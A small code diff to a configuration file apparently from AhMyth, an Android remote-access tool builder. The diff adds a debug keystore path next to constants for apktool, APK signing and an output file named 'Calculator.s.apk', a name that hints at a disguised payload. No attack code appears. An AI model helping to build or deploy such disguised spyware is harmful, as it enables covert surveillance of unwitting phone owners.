@@ -7,6 +7,7 @@ exports.signedApkName = 'Calculator.s.apk';
 exports.ahmythApkFolderPath = path.join(__dirname, '..', '..', 'Factory/Ahmyth').replace("app.asar", "app.asar.unpacked");
 exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
 exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");;
+exports.keystorePath = path.join(__dirname, '..', '..', 'Factory/debug.keystore').replace("app.asar", "app.asar.unpacked");
 exports.dataDir = 'AhMyth'
 exports.downloadPath = 'Downloads';
 exports.outputApkPath = 'Output';
